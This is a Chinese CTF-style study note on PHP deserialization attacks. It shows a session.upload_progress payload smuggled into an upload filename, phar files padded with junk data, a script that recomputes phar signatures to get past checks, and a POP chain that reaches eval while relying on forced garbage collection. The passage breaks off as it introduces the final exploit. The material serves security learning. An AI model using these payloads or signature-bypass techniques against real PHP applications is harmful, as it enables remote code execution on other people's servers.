<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>

<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
<h4 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h4><p><strong>同样需要php≥5.4</strong></p>
<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，表示当文件上传结束后，php将会立即清空对应session文件中的内容，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
<p>开始解析：</p>
<ol>
<li></li>
</ol>
<ul>
<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
</ul>
<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
<p>其他例题参考：<br>简单过程说明以及其他ctf题解<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h3 id="phar反序列化基础"><a href="#phar反序列化基础" class="headerlink" title="phar反序列化基础"></a>phar反序列化基础</h3><p>phar是一种文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641632023214.png" alt="image-20240303175826285"></p>
<p>phar与反序列化关系</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163173458e.png" alt="image-20240303180037559"></p>
<p>结构：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416323ea225.png" alt="image-20240303180142912"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416322084e7.png" alt="image-20240303180338837"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641632425ffb.png" alt="image-20240303180413877"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641632269c76.png" alt="image-20240303180429119"></p>
<p>原理：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416321cbe89.png" alt="image-20240303180705908"></p>
<p>例1：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416312cbfb2.png" alt="image-20240303180820143"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630f2077f.png" alt="image-20240303181134271"></p>
<p>（改类名 命令）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641a0e937350.png" alt="image-20240303181349949"></p>
<p>条件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631ddae81.png" alt="image-20240303181625522"></p>
<p>例2：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416318000d2.png" alt="image-20240303181818732"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631d55b04.png" alt="image-20240303181937798"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163182c5d1.png" alt="image-20240303182021472"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641a0ef6e8d9.png" alt="image-20240303182128988"></p>
<p>生成.phar文件</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631787c31.png" alt="image-20240303182310868" style="zoom:150%;" />

<p>版本问题 </p>
<p>把php.ini中的参数（phar.readonly）改了</p>
<p>不挑后缀</p>
<p>text.phar-&gt;text.jpg</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631546fd4.png" alt="image-20240303182806367"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416321ae70d.png" alt="image-20240303182838379"></p>
<h3 id="脏数据污染"><a href="#脏数据污染" class="headerlink" title="脏数据污染"></a>脏数据污染</h3><p>phar支持的格式</p>
<p>phar文件可以是下面三种格式：</p>
<blockquote>
<ul>
<li>zip .zip .phar.zip </li>
<li>tar .tar .phar.tar .pahr..tar.gz .phar.tar.bz </li>
<li>phar .phar .phar.bz2   <code>bzip2 phar.phar</code></li>
</ul>
</blockquote>
<p>在实战中的利用</p>
<ol>
<li>可以使用压缩包的方法直接将数据压缩为<code>zip</code>,<code>tar</code>,<code>tar.gz</code>,<code>tar.bz</code>从而绕过<code>stub</code>或反序列化字段的检测(zip不会压缩反序列化数据段) </li>
<li>可以使用<code>.phar格式修复</code>的方法解决phar文件头部(使用phar)或者文件尾(使用tar)被添加脏数据的问题</li>
</ol>
<h4 id="zip添加脏数据"><a href="#zip添加脏数据" class="headerlink" title="zip添加脏数据"></a>zip添加脏数据</h4><p> — 头尾均可添加脏数据但是phar无法解析</p>
<p><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/phith0n/PaddingZip&source=article&objectId=2287505">https://github.com/phith0n/PaddingZip</a> </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">python paddingzip.<span class="property">py</span> -i ../test.<span class="property">phar</span>.<span class="property">zip</span> -o ../test1.<span class="property">phar</span>.<span class="property">zip</span> --prepend <span class="string">&quot;this prepend to the start&quot;</span> --append <span class="string">&quot;this append to the end&quot;</span></span><br></pre></td></tr></table></figure>

<p>此外在readme手册中还提到可以在linux中通过以下方式添加脏数据:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$ echo -n <span class="string">&quot;prepend&quot;</span> &gt; f</span><br><span class="line">$ cat f a.<span class="property">zip</span> &gt; b.<span class="property">zip</span></span><br><span class="line">$ zip -F b.<span class="property">zip</span> --out c.<span class="property">zip</span></span><br></pre></td></tr></table></figure>

<p>在phar中的使用限制</p>
<p>ZIP格式的文件头尾都可以有脏字符，通过对偏移量的修复就可以重新获得一个合法的zip文件。但是否遵守这个规则，仍然取决于zip解析器，经过测试，phar解析器如果发现文件头不是zip格式，即使后面偏移量修复完成，也将触发错误</p>
<p>虽然zip添加不了脏数据让人大失所望,但是却在这里看到了zip却只要将phar的内容写进压缩包注释中，也同样能够反序列化，而且压缩后的zip数据也可以绕过stub检测,但是过不了反序列化数据检测(和Phar执行zip生成格式差不多,但是挺有意思的记一下吧)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    public  <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">var_dump</span>(__FUNCTION__);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">phar_file = <span class="title function_">serialize</span>(<span class="keyword">new</span> <span class="title function_">test</span>());zip = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">res =zip-&gt;<span class="title function_">open</span>(<span class="string">&#x27;justzip.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>);</span><br><span class="line">zip-&gt;<span class="title function_">addFromString</span>(<span class="string">&#x27;h0cksr.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);zip-&gt;<span class="title function_">setArchiveComment</span>(phar_file);zip-&gt;<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">readfile</span>(<span class="string">&quot;phar://justzip.zip&quot;</span>);</span><br></pre></td></tr></table></figure>



<p>哪些场景不能解析带脏字符的zip文件呢? </p>
<ol>
<li>Java -jar执行这个带脏字符的jar包时会失败</li>
<li>PHP无法解析 </li>
<li>7zip无法解析</li>
</ol>
<h4 id="tar添加脏数据"><a href="#tar添加脏数据" class="headerlink" title="tar添加脏数据"></a>tar添加脏数据</h4><p> — 可以在文件尾添加脏数据且phar正常解析</p>
<p><strong>对于tar格式</strong>，如果能控制文件头，即可构造合法的tar文件，即使文件尾有垃圾字符</p>
<p>这个测试的话毫无技术要求,直接使用010打开<code>tar</code>文件, 然后触发调用可以看到phar反序列化还是被正常执行了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//class test&#123;</span></span><br><span class="line"><span class="comment">//    public  function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        var_dump(__FUNCTION__);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//phar=new phar(&#x27;test.phar&#x27;);//后缀名必须为phar</span></span><br><span class="line"><span class="comment">//phar = phar-&gt;convertToExecutable(Phar::TAR);</span></span><br><span class="line"><span class="comment">//phar-&gt;startBuffering();</span></span><br><span class="line"><span class="comment">/*phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub*/</span></span><br><span class="line"><span class="comment">//obj=new test();</span></span><br><span class="line"><span class="comment">//phar-&gt;setMetadata(obj);//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="comment">//phar-&gt;addFromString(&quot;flag.txt&quot;,&quot;flag&#123;h0cksr&#125;&quot;);//添加要压缩的文件</span></span><br><span class="line"><span class="comment">////签名自动计算</span></span><br><span class="line"><span class="comment">//phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="comment">//?&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    public  <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">var_dump</span>(__FUNCTION__);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">var_dump</span>(</span><br><span class="line">    <span class="title function_">file_get_contents</span>(<span class="string">&quot;compress.zlib://phar://test1.phar.tar/flag.txt&quot;</span>)<span class="comment">//未修改,读取数据失败,反序列化触发成功</span></span><br><span class="line">);</span><br><span class="line"><span class="title function_">var_dump</span>(</span><br><span class="line">    <span class="title function_">file_get_contents</span>(<span class="string">&quot;compress.zlib://phar://test2.phar.tar/flag.txt&quot;</span>)<span class="comment">//文件头添加内容,读取数据失败,反序列化触发失败</span></span><br><span class="line">);</span><br><span class="line"><span class="title function_">var_dump</span>(</span><br><span class="line">    <span class="title function_">file_get_contents</span>(<span class="string">&quot;compress.zlib://phar://test3.phar.tar/flag.txt&quot;</span>)<span class="comment">//文件尾添加内容,读取数据失败,反序列化触发成功</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>这段PHP代码主要展示了如何使用Phar归档文件，以及如何通过Phar文件来触发对象的反序列化。Phar是一种PHP的归档格式，允许开发者将多个PHP文件打包成一个文件，并可以直接通过PHP解释器执行。</p>
<p>然而，代码中有一些注释掉的部分，这些部分原本是用来创建Phar文件的。代码的目的似乎是为了测试不同情况下通过Phar文件读取数据时，是否能够成功触发对象的反序列化。</p>
<p>此外还在<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://exp10it.cn/2022/08/phar-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87/%23%E4%BD%BF%E7%94%A8-tar-%E7%BB%95%E8%BF%87%E7%AD%BE%E5%90%8D&source=article&objectId=2287505">使用 tar 绕过签名</a>看到可以直接使用打包一个只放了反序列化数据的<code>.metadata</code>文件生成的.tar压缩包可以直接用来触发反序列化</p>
<blockquote>
<p> linux环境下执行  mkdir test;cd test mkdir .phar;cd .phar echo ‘O:4:”test”:0:{}’ &gt; .metadata cd ..&#x2F;.. tar -cf phar.tar .phar&#x2F; 生成的<code>phar.tar</code>可以直接通过<code>phar://phar.tar</code>触发反序列化 </p>
</blockquote>
<h4 id="pahr文件"><a href="#pahr文件" class="headerlink" title="pahr文件"></a>pahr文件</h4><p> — 可以在文件头添加脏数据且phar正常解析</p>
<p><strong>phar格式</strong>，必须控制文件尾，<code>但不需要控制文件头</code>。PHP在解析时会在文件内查找<code>&lt;?php __HALT_COMPILER(); ?&gt;</code>这个标签，这个标签前面的内容可以为任意值，但后面的内容必须是phar格式，并以该文件的sha1签名与字符串<code>GBMB</code>结尾。</p>
<p>phar格式可以直接在文件头加脏数据并且还能正常反序列化, 但是这点需要重新计算一下签名, 下面就是修正签名的脚本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">    content = f.<span class="title function_">read</span>()</span><br><span class="line"></span><br><span class="line">text = content[:-<span class="number">28</span>]</span><br><span class="line">end = content[-<span class="number">8</span>:]</span><br><span class="line">sig = hashlib.<span class="title function_">sha1</span>(text).<span class="title function_">digest</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;phar_new.phar&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">    f.<span class="title function_">write</span>(text + sig + end)</span><br></pre></td></tr></table></figure>



<p>(pahr默认使用sha1加密就是有<code>20字节</code>的签名生成结果, 在签名后面还有<code>8字节</code>,<code>前4字节表示文件使用的签名算法</code>,<code>最后四字节固定用于表示该文件存在签名</code>)</p>
<p>phar文件内容&#x3D;数据段+签名(默认sha1有20字节大小)+签名方式(4字节)+声明文件有无签名(4字节)</p>
<p>除了sha1之外phar还可以使用<code> MD5, SHA256, SHA512, OpenSSL</code>生成签名</p>
<p>签名是前面全部<code>数据段</code>的内容根据加密算法加密得到的结果</p>
<p>所以当我们想要利用phar触发反序列化但是上传的文件在头部被添加了脏数据的话我们可以通过以下方法构造可利用的phar文件:</p>
<blockquote>
<ol>
<li>先生成正常的的<code>.pahr</code>文件</li>
<li>往文件头部添加脏数据</li>
<li>使用上面代码改正签名</li>
<li>使用010editor将头部的脏数据删除</li>
<li>上传文件</li>
</ol>
</blockquote>
<h2 id="GC强制回收"><a href="#GC强制回收" class="headerlink" title="GC强制回收"></a>GC强制回收</h2><p>__dustruct执行条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：对象为null</span><br><span class="line">2：生命周期结束的时候</span><br><span class="line">3：当一个对象被unset （GC)</span><br></pre></td></tr></table></figure>

<p>由此</p>
<blockquote>
<p>如果程序走了一半，突然报错，那么<code>__destruct()不会触发了，那如果又必须要__destruct()触发</code>,又该如何操作呢？</p>
</blockquote>
<p>PHP Garbage Collection简称GC，又名垃圾回收，在PHP中使用引用计数和回收周期来自动管理内存对象的。</p>
<p>垃圾，顾名思义就是一些没有用的东西。在这里指的是一些数据或者说是变量在进行某些操作后被置为空(NULL)或者是没有地址(指针)的指向，这种数据一旦被当作垃圾回收后就相当于把一个程序的结尾给划上了句号，那么就不会出现无法调用__destruct()方法了。</p>
<p>具体原理可查看php官方解答<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/features.gc.collecting-cycles.php">PHP: 回收周期(Collecting Cycles) - Manual</a></p>
<p>接下来用演示代码演示GC的实际工作原理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;num = <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__destruct()&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">errorr</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr</span>(<span class="number">2</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr</span>(<span class="number">3</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416313d17a7.png" alt="image-20240312201424971"></p>
<p>如图，</p>
<p><code>new了一个errorr对象，屁股还没坐热就__destruct()了。后面的两个对象则是按部就班先创建完没有操作了以后才结束的。</code></p>
<p><strong>区别就在于对象1没有任何引用也没有指向，在创建的那一刻就被当作垃圾回收了，从而触发了__destruct()方法。</strong></p>
<p>进而，如果没有指向可以，那如过在指向一个对象的中途忽然指向另一个，也就是舍弃了该对象又会怎么样。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240312201642801.png" alt="image-20240312201642801"></p>
<p>仍然触发了__destruct</p>
<p>但若注销了<code>$c[0]=$c[1]</code>呢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416313d6b21.png" alt="image-20240312201830825"></p>
<p>如图 正常创建，最后销毁</p>
<p>当一个对象没有任何引用的时候，则会被视为“垃圾”，即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new test();</span><br></pre></td></tr></table></figure>

<p>test 对象被 变量 a 引用， 所以该对象不是“垃圾”，而如果是这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new test();</span><br><span class="line">或这样</span><br><span class="line"></span><br><span class="line">$a = new test();</span><br><span class="line">$a = 1;</span><br></pre></td></tr></table></figure>

<p>这样在 test 在没有被引用或在失去引用时便会被当作“垃圾”进行回收,触发__destruct。</p>
<p>这就是GC回收的大致理解</p>
<p>所以例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr0</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __toString&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;err-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __flag()&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;就这？&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>明显</p>
<p>首端 –&gt; <strong>errorr0::__destruct()</strong> –&gt; <strong>errorr1::__toString()</strong> –&gt; <strong>errorr2::flag()</strong> –&gt;尾巴。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr0</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;num = <span class="keyword">new</span> <span class="title function_ invoke__">errorr1</span>();</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;err = <span class="keyword">new</span> <span class="title function_ invoke__">errorr2</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr0</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是 如果没有这句**throw new Exception();<strong>就真的构造完了，但是有的话</strong>__destruct()<strong>是不会执行的，而</strong>__destruct()**不执行这条链子根本就是堵死的，没啥用</p>
<p>根据之前说的<strong>GC回收机制</strong>可以把一段数据当做垃圾回收，那不就可以执行**__destruct()<strong>，然后就有一个问题——-如何触发</strong>GC回收机制**？！！还记得，之前举过的例子吗？如过没有如何东西指向一个对象，那个对象就会被当作垃圾回收。所以，我们先看修改后的exp</p>
